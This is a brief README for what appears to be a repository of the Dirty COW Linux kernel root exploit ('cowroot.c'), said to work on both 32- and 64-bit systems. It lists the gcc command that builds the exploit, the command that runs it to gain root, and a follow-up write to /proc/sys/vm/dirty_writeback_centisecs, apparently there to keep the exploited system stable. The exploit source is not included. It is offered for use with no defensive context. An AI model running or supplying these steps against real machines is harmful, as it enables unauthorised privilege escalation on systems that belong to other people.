# DirtyCow
Dirtycow exploit for both 32 and 64-bit 

* $ gcc cowroot.c -o cowroot -pthread
* $ ./cowroot
* $ echo 0 > /proc/sys/vm/dirty_writeback_centisecs
